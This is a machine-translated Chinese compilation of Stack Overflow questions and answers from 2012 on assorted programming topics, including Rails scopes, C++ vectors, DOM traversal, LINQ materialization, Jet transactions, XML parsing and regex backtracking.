php 中的 Hash 等价于`//` 所以它只是一个注释

他们可能会解析您的页面并查找该值并在两者之间获取所有内容。

# activerecord - 如果属性为空，我如何不使用范围

> ID：12014937
> 
> 赞同：0
> 
> 时间：2012-08-18T01:01:47.810
> 
> 标签：activerecord, ruby-on-rails-3.2, dry

我的控制器中有以下内容：

```
 @filt= params[:filter] || 'no_filter'
if params[:subcategory].nil? || params[:subcategory] == "null"
  @resources = Resource.find_by_category(params[:category]).approved.send(@filt).page(params[:page]).per(30)
else
  @resources = Resource.find_by_category(params[:category]).find_by_subcategory(params[:subcategory]).approved.send(@filt).page(params[:page]).per(30)
end 
```

我想减少这段代码，以免重复？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-03T13:47:17.660

```
@filt= params[:filter] || 'no_filter'
r = Resource.find_by_category(params[:category])
r = r.find_by_subcategory(params[:subcategory]) unless [nil, 'null'].include? params[:subcategory] 
@resources = r.approved.send(@filt).page(params[:page]).per(30) 
```

您不必将所有内容放在一行中以链接范围`Model.scope1.scope2`等。您可以通过 来完成`s = Model.scope1; s = s.scope2`，如上面的代码示例中所示。

# fireworks - Fireworks - 从特定像素颜色中删除颜色

> ID：12014939
> 
> 赞同：0
> 
> 时间：2012-08-18T01:01:59.660
> 
> 标签：fireworks

![在此处输入图像描述](../Images/736bbe167dd98fa2ec07b70de63b588d.png)

从那张图片中，我想删除该特定颜色的所有实例，而不必一次手动处理每个像素。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-10T13:25:13.657

您可以使用*选择/选择相似*来选择具有该颜色的所有像素，但请记住，*选择相似*受魔术棒 (W) 工具的容差设置的影响。

因此，首先选择魔棒并将容差设置为零，然后选择要删除的像素之一（例如，选取框 (M) 和边缘设置为硬），然后运行*​​Select / Select Similar*。您可以使用油漆桶 (G) 将选择替换为您想要的任何颜色。

当然，如果您确实想捕捉颜色不完全相同的像素，您可以将 Tolerance 设置得稍高一些。

# c++ - 创建一个类数组不起作用

> ID：12014940
> 
> 赞同：1
> 
> 时间：2012-08-18T01:02:22.493
> 
> 标签：c++

我正在尝试使用向量创建一个类数组，但我认为实例化数组时语法错误。我得到的错误是：

`error: request for member 'setX' in objects[0], which is of non-class type 'std::vector'`

```
#include <iostream>
#include <vector>

using std::cout;

class A {
    public:
        void setX(int a) { x = a; }
        int getX() { return x; }
    private:
        int x;
};

int main() {

    std::vector<A> *objects[1];

    objects[0].setX(5);
    objects[1].setX(6);

    cout << "object[0].getX() = " << objects[0].getX() << "\nobject[1].getX() = " << objects[1].getX() << std::endl;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-18T01:05:45.887

```
std::vector<A> objects; // declare a vector of objects of type A
objects.push_back(A()); // add one object of type A to that vector
objects[0].setX(5); // call method on the first element of the vector 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-18T01:06:31.727

使用星号和方括号，您声明的是指向向量的指针数组，而不是向量。你`std::vector<T>`不需要方括号或星号：

```
std::vector<A> objects(2); // 2 is the number of elements; Valid indexes are 0..1, 2 is excluded

objects[0].setX(5); // This will work
objects[1].setX(6); 
```

编译器认为您试图调用`setX`a`vector`的原因是方括号运算符（由向量重载）也是数组或指针上的有效运算符。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-18T01:05:46.120

数组和`std::vector`是两种完全不同的容器类型。数组实际上是固定大小的内存块，其中`std:vector`对象是动态顺序容器类型，这意味着它可以在运行时动态“增长”和“缩小”，对象本身管理内存分配它拥有的对象。它们明显的相似之处在于都可以访问复杂度为 O(1) 的成员，并且可以使用括号语法来访问成员。

您想要的是以下内容：

```
int main() 
{

    //make a call to the std::vector<T> cstor to create a vector that contains
    //two objects of type A
    std::vector<A> objects(2);

    //you can now access those objects in the std::vector through bracket-syntax

    objects[0].setX(5);
    objects[1].setX(6);

    cout << "object[0].getX() = " << objects[0].getX() << "\nobject[1].getX() = " << objects[1].getX() << std::endl;

    return 0;
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-18T01:13:01.053

在这里，您所做的是定义一个包含 1 个*std::vector* * 类型元素的数组，您可能需要先阅读有关[向量](http://www.cplusplus.com/reference/stl/vector/)和[数组](http://www.cplusplus.com/doc/tutorial/arrays/)的更多信息。

定义它的正确方法是：

```
std::vector<A> objects(2); 
```

或使用指针，如果这是你打算

```
std::vector<A*> objects(2);
objects[0] = new A();
objects[1] = new A(); 
```

# javascript - 在 JavaScript 中迭代 DOM 时关闭标记事件

> ID：12014941
> 
> 赞同：0
> 
> 时间：2012-08-18T01:02:44.683
> 
> 标签：javascript, dom

我正在编写一个 Chrome 扩展程序来将 HTML 页面转换为不同的格式。

如果我使用`document.getElementsByTagName("*")`并迭代该集合，我可以看到所有标签。但是，这是一个平面表示。我需要检测打开和关闭“事件”，例如 SAX 解析器，以便我的翻译输出保持正确的包含/嵌套。

在 JavaScript 中执行此操作的正确方法是什么？必须手动执行此操作似乎有点尴尬。有没有其他方法可以做到这一点？

为了说明我的意思...

```
 <html>
       <body>
           <h1>Header</h1>
           <div>
               <p>some text and a missing closing tag
               <p>some more text</p>
           </div>
           <p>some more dirty HTML
        </body>
    <html> 
```

我需要按以下顺序获取事件：

```
 html open
    body open
    h1 open
    text
    h1 close
    div open
    p open
    text
    p close
    p open
    text
    p close
    div close
    p open
    text
    p close
    body close
    html close 
```

我觉得在我的迭代中跟踪类似 SAX 解析器的事件取决于我。我还有其他选择吗？如果没有，你能指出我的任何示例代码吗？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T01:19:51.370

只需遍历每个节点和每个节点的所有子节点。当一个级别的孩子用尽时，标签关闭。

```
function parseChildren(node) {

    // if this a text node, it has no children or open/close tags
    if(node.nodeType == 3) {
        console.log("text");
        return;
    }

    console.log(node.tagName.toLowerCase() + " open");

    // parse the child nodes of this node
    for(var i = 0; i < node.childNodes.length; ++i) {
        parseChildren(node.childNodes[i]);
    }

    // all the children are used up, so this tag is done
    console.log(node.tagName.toLowerCase() + " close");
} 
```

要遍历整个页面，只需执行`parseChildren(document.documentFragment)`. 您可以用`console.log`您喜欢的任何行为替换这些语句。

请注意，此代码报告了很多`text`节点，因为标签之间的空格算作文本节点。为避免这种情况，只需扩展文本处理代码：

```
 if(node.nodeType == 3) {
        // if this node is all whitespace, don't report it
        if(node.data.replace(/\s/g,'') == '') { return; }

        // otherwise, report it
        console.log("text");
        return;
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T01:08:59.910

我不认为有它的工具，所以你应该只写一些递归函数，你会在其中`get first child`以某种方式`get next node`，`get parent`等等。

# wpf - WPF 故事板错误

> ID：12014952
> 
> 赞同：-2
> 
> 时间：2012-08-18T01:04:46.520
> 
> 标签：wpf

我已经在窗口的资源中定义了故事板。当我在文件后面的代码中访问这个故事板时，发生了以下错误

“在 MainWindow 的名称范围内找不到‘this’名称”

我的代码是

```
 Storyboard sb = this.Resources["transferToBasketStoryboard"] as Storyboard
    sb.Begin(); 
```

谁能帮我？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T04:40:16.427

验证您是否在`window.resources`范围内创建了此 Storyboard，因此 MainWindow.Xaml 应以：

```
<Window
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns: ..... 
    x:Class="myWpfApplication.MainWindow"
    Title="MainWindow" Height="350" Width="525">
<Window.Resources>// the resource should be here
    <Storyboard x:Key="transferToBasketStoryboard">
        <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(TransformGroup.Children)[2].(RotateTransform.Angle)" Storyboard.TargetName="textBlock">
            <EasingDoubleKeyFrame KeyTime="0" Value="0"/>
            <EasingDoubleKeyFrame KeyTime="0:0:1" Value="60"/>
        </DoubleAnimationUsingKeyFrames>
    </Storyboard>
</Window.Resources> 
```

# iphone - 归档 iPhone 应用程序时出现警告，但仍能成功上传

> ID：12014953
> 
> 赞同：0
> 
> 时间：2012-08-18T01:04:58.610
> 
> 标签：iphone, xcode, app-store, warnings

当我在应用商店归档我的 iPhone 应用程序以供审查时，我收到了警告：

> 应用程序未通过协同设计验证。签名无效，包含不允许的权利，或者未使用 iPhone 分发证书签名。(-19011)

我没有多想，因为这只是一个警告。我通过管理器将应用程序上传到应用程序商店，无论警告如何，它都成功了。我应该担心警告吗？它会以任何方式影响应用程序的审核过程或分发吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T05:29:48.070

在对 Apple 开发者指南和 Google 进行一些研究后，我发现我使用了错误的配置文件。在 Project > Build Settings > All > Code Signing > Release 下，配置文件应设置为“iPhone Distribution: Your Name”，而不是 iPhone Developer。

# facebook - Facebook API：我可以访问我页面的用户内容吗？

> ID：12014955
> 
> 赞同：0
> 
> 时间：2012-08-18T01:05:12.733
> 
> 标签：facebook, facebook-graph-api

我正在尝试为我的页面开发一个管理工具，为此，我需要访问我的用户发布的内容（因为我重新发布了他们的很多内容 - 例如照片）

看起来我可以访问我发布的所有内容，但我似乎找不到任何对允许我访问用户内容的功能的引用。

这在 API 中不可用吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T02:41:32.533

您可以在以下位置获取页面的所有帖子：

```
https://graph.facebook.com/[PAGE_NAME_OR_ID]/feed?access_token=... 
```

但是，您不能很好地过滤这个。为您提供更多控制权的一个选项是 FQL。[流](https://developers.facebook.com/docs/reference/fql/stream/)表的这个查询应该让您开始使用其他人的帖子。

```
SELECT post_id, actor_id, message, attachment, permalink FROM stream
  WHERE source_id = [PAGE_ID] AND filter_key = 'others' 
```

如果用户已将他们的帖子设置为私有，则此调用不会将其返回。您还需要注意`stream`表格的限制：它在过去 30 天内最多只能返回 50 个帖子。如果你想要更多，你必须使用一个 LIMIT 子句来翻阅你的结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T06:12:24.987

根据我的经验，我正在开发过去两年的 Facebook 应用程序，您无法获取任何用户信息，并且使用**Page Signed 请求**您可以获得**用户 ID、isowner、timezone 和 isLiked** only..

# iphone - 创建一个 NSManagedObject 并在视图控制器之间传递它

> ID：12014959
> 
> 赞同：-1
> 
> 时间：2012-08-18T01:06:13.840
> 
> 标签：iphone, core-data

所以我不确定这应该如何工作。我有一个名为 Map 的 NSManagedObject 子类。它是这样创建的：

```
- (void)mapView:(MKMapView *)mapView regionDidChangeAnimated:(BOOL)animated {
   // create map with below initializer
MKCoordinateRegion region = MKCoordinateRegionForMapRect(mapView.visibleMapRect);

   self.map = [Map mapWithName:nil: region:region inManagedObjectContext:self.managedObjectContext;
}

+ (Map *)mapWithName:(NSString *)mapName region:(MKCoordinateRegion)region inManagedObjectContext:(NSManagedObjectContext *)context {
    Map *aMap = [Map mapWithName:mapName inManagedObjectContext:context];
    aMap.centerLatitude = @(region.center.latitude);
    aMap.centerLongitude = @(region.center.longitude);
    aMap.latitudeDelta = @(region.span.latitudeDelta);
    aMap.longitudeDelta = @(region.span.longitudeDelta);

    return aMap;
} 
```

我把 Map 对象放在这里，因为委托方法

```
- (void)mapViewDidFinishLoadingMap:(MKMapView *)mapView 
```

并不总是被调用，但 regionDidChangeAnimated: 会。问题是，这可以在 NSManagedObjectContext 中创建 1-7 个地图对象。因此，当我进入下一个屏幕时，即使我只有一个 self.map 属性，我的 fetchedResultsController.fetchedObjects 中也会有 1-7 个地图对象，并用一堆相同的对象填充下一页上的 TableViewController。有一个更好的方法吗？我想我可以制作一个模仿 NSManagedObject 的常规 MapTemp : NSObject ，并且只在需要保存 Map 或其他东西时才创建 Map : NSManagedObject 。

想法？谢谢！

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-18T06:10:11.373

如果您不想要多个对象，那么*为什么要创建它们*？
要么*删除*你不想要的那些，或者更好地*更新*现有的。

# visual-studio-2012 - Visual Studio 2012 是否包含完整的 Windows SDK

> ID：12014963
> 
> 赞同：8
> 
> 时间：2012-08-18T01:06:24.103
> 
> 标签：visual-studio-2012, winapi

如果我安装了 Visual Studio 2012，是否需要安装 Windows SDK，或者 SDK 的所有工具/部分都包含在 Visual Studio 安装中。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-18T16:07:05.423

Visual Studio 2012 安装程序不包含完整的 Windows SDK 或 Visual Studio 2012 SDK。这些需要单独安装。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-04T09:31:56.163

取决于您安装的 VS 2012 版本。专业版及以上版本包括 Windows 8 SDK，因此除非您计划为 Windows XP 或更早版本的操作系统开发应用程序，否则无需单独安装 SDK - 您已经拥有它。

但是，如果您已经安装了 VS 2012 Express，我建议您参考在线文档以了解此问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-01-06T19:29:20.363

有关更多信息，请参阅此帖子：

[http://blogs.msdn.com/b/chuckw/archive/2012/03/22/where-is-the-directx-sdk.aspx](http://blogs.msdn.com/b/chuckw/archive/2012/03/22/where-is-the-directx-sdk.aspx)

> “DirectX SDK 现在是 Windows 8.0 SDK 的一部分。”
> 
> “适用于 Windows 8 的 Windows SDK（又名 Windows 8.0 SDK）包含在 Visual Studio 2012 中，也可作为独立包与 Visual Studio 2010 一起使用。”

# php - 除了IP地址外，是否有任何计算机特定信息用于跟踪？

> ID：12014964
> 
> 赞同：2
> 
> 时间：2012-08-18T01:06:25.713
> 
> 标签：php, javascript, jquery, tracking

我正在开发一个程序，只允许同一台计算机查看特定页面一次，然后我阻止访问该页面。

我的问题是，IP 地址可以正常工作，但有些用户每次访问该站点时都有一个新 IP。过去，我遇到过其他使用其他方法跟踪用户的网站，因为即使在同一台计算机上使用不同的 IP，我也无法查看受限内容。

有人有什么想法吗？

IP 地址的其他选项是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T01:10:50.827

您可以做的最好的事情是将功能绑定到用户帐户。这样，您就可以控制用户看到的内容。

绑在机器上是不可靠的。

*   IP 经常更改或可能被欺骗。如果用户使用代理怎么办？
*   UA也可以被欺骗
*   可以禁用或删除 Cookie
*   LocalStorage 也可以删除，不广泛支持

基本上，除非用户选择注册您的服务，否则用户可以完全自由地摆脱您的限制。这也是你所说的*隐私*。

当用户共享 PC 时，你有没有想过？如果你爸爸在你的笔记本电脑上被屏蔽了怎么办？您无法再在笔记本电脑上查看它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T01:08:58.497

没有一种方法可以让任何一台计算机都独一无二。

您可以在该浏览器上设置 cookie，但用户可以使用其他浏览器或直接删除 cookie。

有运行 flash 模块以获取计算机特定数据以创建您可以使用的 guid 的 3rd 方服务，但这更昂贵并且还需要用户加载您的 flash 模块，这意味着它不适用于某些移动浏览器.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-18T04:23:32.413

如果页面不公开并发送给用户（即通过电子邮件），您可以生成带有 ID 的 URL，一旦访问该页面，他们就会使 ID 无效。

这是电子邮件验证页面常用的方法。

# database - JET 中的事务隔离？

> ID：12014966
> 
> 赞同：2
> 
> 时间：2012-08-18T01:06:35.823
> 
> 标签：database, ms-access, oledb, jet, isolation-level

[MSDN](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724261%28v=vs.85%29.aspx)对其 OLEDB 提供程序的 JET 事务隔离描述如下：

> Jet 在事务中支持五层嵌套。唯一支持的事务模式是已提交读。设置较低级别的事务分离意味着已提交读。设置更高的级别将导致 StartTransaction 失败。
> 
> Jet 仅支持单阶段提交。

[MSDN](http://msdn.microsoft.com/en-us/library/aa259216%28SQL.80%29.aspx)描述`Read Committed`如下：

> 指定在读取数据时保持共享锁以避免脏读，但可以在事务结束之前更改数据，从而导致不可重复读取或幻像数据。此选项是 SQL Server 的默认选项。

* * *

我的问题是：

1.  什么是单阶段提交？这对事务和隔离有什么影响？

2.  上面描述的 Read Committed 隔离级别是否适合我的[要求](https://stackoverflow.com/questions/12002411/how-to-prevent-concurrency-issue-with-database-update)？

3.  使用 Jet 实现可序列化事务隔离的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T12:36:23.957

按问题编号：

1.  单阶段提交用于您的所有数据都在一个数据库中——事务的活动以原子方式提交，您就完成了。如果您有一个需要跨多个存储引擎分布的逻辑事务（例如用于元数据的关系数据库和用于大 blob 的某种文档存储），您可以使用*事务管理器*来协调活动，以便将工作持久化如果两个产品都支持*两阶段提交*，则两者都或都不。他们只是告诉你他们*不*支持两阶段提交，因此该产品不适合分布式事务。

2.  是的，如果您检查`UPDATE`语句本身中的条件；否则你可能会遇到问题。

3.  他们似乎在暗示你不能。

顺便说一句，我在各种各样的环境中担任顾问数十年。由于性能问题，我不止一次参与*从Jet 迁移人员。*在一种情况下，一个简单的“星形”类型查询运行了两分钟，因为它是在客户端加入而不是让数据库来做。作为对数据库的直接查询，它是亚秒级的。在另一种情况下，有一个报告需要 72 小时才能通过 Jet 运行，而直接针对数据库运行则需要 2 分钟。如果它通常适合您，您可以通过使用 Jet 导致性能问题的存储过程来处理这种情况。

# c# - 何时使用 LINQ 的 .ToList() 或 .ToArray()

> ID：12014969
> 
> 赞同：17
> 
> 时间：2012-08-18T01:06:48.490
> 
> 标签：c#, linq, .net-4.5, deferred-execution

运行此代码后：

```
var input = new List<T>( ... );
var result = input.Select( t => new U(t) );

U first1 = null;
foreach ( U u1 in result )
    if ( first1 == null )
        first1 = u1;

U first2 = null;
foreach ( U u2 in result )
    if ( first2 == null )
        first2 = u2; 
```

然后'first1 == first2'评估为假，即使两个U都包装相同的T。我还没有测试过，但我认为可以通过链接.ToList（）或.ToArray（）来评估为真到 Select() 调用上。

在实际代码中，这比这个简单的插图要复杂得多，在决定是否应该附加 .ToList() 或 .ToArray() 时，有什么好的经验法则？我最初的想法是任何可能被多次迭代的引用表达式，或者为了更安全，以防潜在的迭代不明显，任何结果永远不会改变的引用表达式。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-08-18T01:10:42.890

不幸的是，我认为这里没有一个好的“硬性”规则。这在很大程度上取决于您期望如何使用结果，以及查询本身实际上在做什么。

> 我最初的想法是任何可能被多次迭代的表达式，或者为了更安全，以防潜在的迭代不明显，任何结果永远不会改变的表达式。

一般来说，如果您要多次使用查询的结果，通过`ToList()`or存储它总是一个好主意`ToArray()`。如果您的 LINQ 查询是“昂贵”的查询，则尤其如此，因为它可以防止昂贵的操作多次运行。

通常，如果您只想枚举结果，那么我会将其保留为`IEnumerable<T>`. 如果您计划存储结果，或多次使用结果，则将其存储在集合中可能会有所帮助。

另一个需要注意的地方是您是否在公共 API 中返回结果。虽然 return 通常很好`IEnumerable<T>`，但根据预期的用例，您可能需要考虑使用`ToList()`来防止操作被多次执行。

至于是否使用`ToList()`或`ToArray()`，这实际上取决于您将如何使用结果。与每个相关的成本几乎相同（`ToList()`如果输入不是，则实际上执行开销略低`ICollection<T>`）。通常，除非我`ToList()`对`ToArray()`数组有特定的需求或愿望，否则我更喜欢。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-18T01:12:29.143

`ToList`调用`List<T>(IEnumerable<T>)`构造函数来创建一个`List<T>`，同时`ToArrary`使用一个内部类`Buffer<T>`来增长数组。

如果源集合 ( `IEnumerable<T>`) 实现了`ICollection`接口，则这两种方法使用相似的代码逻辑来复制数据。

```
ICollection.CopyTo(array, 0); 
```

否则，`ToList`将`List<T>`动态创建。While`ToArray`将元素一个一个地复制到一个新数组中。如果数组已满，则该方法将数组大小加倍以保存数据。最后，该方法根据源集合的大小返回另一个数组。

# java - 解析 DOM - org.xml.sax.SAXParseException

> ID：12014970
> 
> 赞同：5
> 
> 时间：2012-08-18T01:07:07.583
> 
> 标签：java, parsing, dom

这就是我要解析的，

```
<?xmlversion="1.0"encoding="UTF-8"standalone="no"?>
<newPlayerConnectionrequest>
    <‌​participantType>1</participantType>
</newPlayerConnectionrequest> 
```

创建消息的客户端代码：

```
Element rootElement = document.createElement(MyServer.NEW_PLAYER_CONNECTION_REQUEST);
    Element participantTypeElement = document.createElement(MyServer.PARTICIPANT_TYPE);
    Text textParticipantType = document.createTextNode(participantType);
    participantTypeElement.appendChild(textParticipantType);
    rootElement.appendChild(participantTypeElement);
    document.appendChild(rootElement);
    StringWriter sw = new StringWriter();
    TransformerFactory tFactory = TransformerFactory.newInstance();
    Transformer transformer;
    try {
        transformer = tFactory.newTransformer();
        DOMSource source = new DOMSource(document);
        StreamResult result = new StreamResult(sw);
        transformer.transform(source, result);
    } catch (TransformerConfigurationException e) {
        e.printStackTrace();
    }
    catch (TransformerException t) {
        t.printStackTrace();
    }
    try {
        conn.setRequestMethod("POST");
    } catch (ProtocolException e) {
        e.printStackTrace();
    }
    conn.setRequestProperty("Content-Type", "text/xml");
    //conn.setRequestProperty("Content-Length", "" +  8);
    conn.setRequestProperty("Content-Language", "en-US");  
    conn.setDoInput(true);
    conn.setDoOutput(true 
```

我收到以下错误：

```
处理指令目标和数据之间需要空格。
org.xml.sax.SAXParseException；行号：1；列号：13；
    处理指令目标和数据之间需要空格。
在 com.sun.org.apache.xerces.internal.parsers.DOMParser.parse(DOMParser.java:253)
在 com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(DocumentBuilderImpl.java:288)
在 MyServer.doPost(MyServer.java:91)
在 javax.servlet.http.HttpServlet.service(HttpServlet.java:755)
在 javax.servlet.http.HttpServlet.service(HttpServlet.java:848)
在 org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:643)
在 org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:450)
在 org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:229)
在 org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1067)
在 org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:377)
在 org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:192)
在 org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1001)
在 org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:129)
在 org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:111)
在 org.eclipse.jetty.server.Server.handle(Server.java:360)
在 org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:454)

```

编辑我要解析的字符串：

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-18T01:16:54.947

这条线是错误的

```
<?xmlversion="1.0"encoding="UTF-8"standalone="no"?> 
```

它应该读

```
<?xml version="1.0"encoding="UTF-8"standalone="no"?> 
```

注意“xml”和“version”之间的空格

谷歌是你的朋友；）

# javascript - localStorage 到底有多持久？

> ID：12014973
> 
> 赞同：2
> 
> 时间：2012-08-18T01:07:15.570
> 
> 标签：javascript, local-storage

我编写了一个使用 localStorage 的 Android PhoneGap 应用程序。只要用户自己不清除localStorage，localStorage是不是一种持久化的方式来存储数据？只要用户不删除数据，数据就会一直存在吗？我的理解是它会持续存在，但我只是想在发布之前确定一下。如果这不是那么持久，还有什么是存储数据的好方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T01:25:26.243

是的。localStorage 是持久的，直到用户清除/禁用它。

# objective-c - 在objective-c中显示方法“参数名称”

> ID：12014974
> 
> 赞同：2
> 
> 时间：2012-08-18T01:07:20.983
> 
> 标签：objective-c, macos, nsdictionary

在objective-c中创建方法时如何显示参数名称？

例如，我注意到 NSDictionary 定义它的方法是这样的：

```
- (void)setValue:(id)valueforKey:(NSString *)key; 
```

但它实际上在使用中显示为：

```
[dictionary setValue:@"myValue" forKey:@"myKey"]; 
```

如果我在头文件中定义了上面相同的存根，它会显示为正在使用中：

```
[self setValue:@"My value" :@"My Key"] 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T01:12:36.797

您缺少一个空格：

```
- (void)setValue:(id)value forKey:(NSString *)key;
//                        ^ HERE 
```

您提供的签名使用标识符`valueforKey`作为第一个形式参数的名称，并使用一个空段作为`key`参数。

# iphone - iOS中无休止的重复滚动/动画背景？

> ID：12014975
> 
> 赞同：1
> 
> 时间：2012-08-18T01:07:22.093
> 
> 标签：iphone, objective-c, ios, cabasicanimation

我被困在动画 2 个图像上，这些图像在 iPhone 视图上水平无限滚动。背景不能有任何空隙。如果这可以只用 1 张图片来完成，那就太好了，但我似乎无法理解。这是我到目前为止的代码：

```
-(void)moveImages {
CABasicAnimation *theAnimation; 
theAnimation=[CABasicAnimation animationWithKeyPath:@"transform.translation.x"];
theAnimation.duration=10;
theAnimation.repeatCount=100;
theAnimation.autoreverses=NO;
theAnimation.fromValue=[NSNumber numberWithFloat:320];
theAnimation.toValue=[NSNumber numberWithFloat:-320];
[theImage.layer addAnimation:theAnimation forKey:@"animateLayer"];

CABasicAnimation *theAnimation2;
theAnimation2=[CABasicAnimation animationWithKeyPath:@"transform.translation.x"];
theAnimation2.duration=10;
theAnimation2.repeatCount=100;
theAnimation2.autoreverses=NO;
theAnimation2.fromValue=[NSNumber numberWithFloat:640];
theAnimation2.toValue=[NSNumber numberWithFloat:-640];
[theImage2.layer addAnimation:theAnimation2 forKey:@"animateLayer2"];

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T01:18:57.550

好吧，在代码中，您可以创建一个由这两者组合而成的新图像。此合成图像宽 960 像素，将第一张图像复制到最右边和最左边的位置。中间位置是第二张图片。

您开始将图像左移 640 像素，因此您只能看到第一张图像。然后为 640 像素设置动画。当您重新启动动画时，图像总是左移 640 像素。

这样你就有了一个动画。

# python - Python 正则表达式：为什么这不起作用？

> ID：12014991
> 
> 赞同：2
> 
> 时间：2012-08-18T01:11:04.833
> 
> 标签：python, regex, substitution

这不会给我错误或答案。

```
re.sub('\\.(\\W|\\.)*[o0](\\W|[o0])*', '*', '..........................................') 
```

为什么它会这样？此外，如果我减少“周期”的数量，那么它就可以工作。

谢谢你。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-18T01:39:03.463

你有[灾难性的回溯](http://www.regular-expressions.info/catastrophic.html)。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-18T01:12:43.073

您的输入字符串中没有`o`或`0`，但您的正则表达式至少需要其中一个字符存在 ( `[o0]`)。

```
>>> re.compile('\\.(\\W|\\.)*[o0](\\W|[o0])*', re.DEBUG)
literal 46
max_repeat 0 65535
  subpattern 1
    branch
      in
        category category_not_word
    or
      literal 46
in
  literal 111
  literal 48
max_repeat 0 65535
  subpattern 2
    branch
      in
        category category_not_word
    or
      in
        literal 111
        literal 48 
```

更新：您的正则表达式正遭受[灾难性的回溯](http://www.regular-expressions.info/catastrophic.html)；避免在带有通配符的组中使用嵌套的字符类或字符集组合（上面列出的`branch .. or`部分`max_repeat`）。您可以将字符类放在字符集中以避免这种情况。

另请注意，您可以使用`r''`原始字符串表示法来避免所有转义的反斜杠。

以下作品：

```
re.sub(r'\.[\W\.]*[o0][\Wo0]*', '*', '..........................................') 
```

因为它编译为：

```
>>> re.compile(r'\.[\W\.]*[o0][\Wo0]*', re.DEBUG)
literal 46
max_repeat 0 65535
  in
    category category_not_word
    literal 46
in
  literal 111
  literal 48
max_repeat 0 65535
  in
    category category_not_word
    literal 111
    literal 48 
```

请注意，现在分支已经消失了。

# javascript - Polyfill CSS 过渡与 Modernizr

> ID：12014993
> 
> 赞同：0
> 
> 时间：2012-08-18T01:11:23.823
> 
> 标签：javascript, css-transitions, modernizr

对于初学者，我不知道`js`。我所知道的，我从别人的工作中掏腰包。我知道那很蹩脚，所以我正在努力学习。我正在尝试将使用 css 转换的导航与`Modernizr`. 我有需要`<script>`的。我不知道用什么来称呼正确-我想。我已经在互联网上寻找教程，但他们都认为我已经知道所以他们没有帮助。`HTML``Modernizr``js``load function``js`

这是[我的网站](http://dev.newfrequency.com/index.html)正在进行中。我正在研究的是导航。它在`Firefox`. 我试图让它在 IE 中工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T07:42:09.947

首先，没有必要为向别人学习而道歉。这就是我们所有人的学习方式。

Modernizr 非常适合帮助您处理旧版浏览器。但要了解 Modernizr 的重要一点是，它本身实际上并没有做任何 polyfills。它只是告诉您任何给定功能是否需要 polyfill。您仍然需要提供该 polyfill 代码。

在您的情况下，您引用了一个名为 的文件`polyfillfortransition.js`，但这似乎在您的网站上不存在。这就是为什么没有任何工作的原因：您正在检测需要 polyfill，但实际上并没有对其进行 polyfill。

所以你需要一个 polyfill 脚本。我实际上不知道有哪一种适合，而且快速搜索也没有找到，但希望这能帮助您指明正确的方向。

# css - 如何从 FriendFeed 小部件中删除边框？

> ID：12014994
> 
> 赞同：0
> 
> 时间：2012-08-18T01:11:47.840
> 
> 标签：css, widget, border, feed, friendfeed

FriendFeed 提供了一个[小部件](http://friendfeed.com/embed/widget)，可以进行一些[CSS 自定义](http://friendfeed.com/embed/css)。但是您似乎无法删除边框（所有内容周围的蓝色大边框）？小部件有一个 URL，如

```
http://friendfeed.com/embed/widget/FOOBAR?v=2&amp;num=30&amp;hide_logo=1&amp;hide_comments_likes=0&amp;hide_subscribe=1 
```

`FOOBAR`用户名在哪里。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T01:35:15.520

在 CSS 中尝试 v3：

```
#friendfeed.widget { border: 0 !important;}​ 
```

或者对于 v2：

```
.friendfeed.widget { border: 0 !important;}​ 
```

如果您还想删除顶部的徽标，请添加：

```
#friendfeed .logo img { display: none; } 
```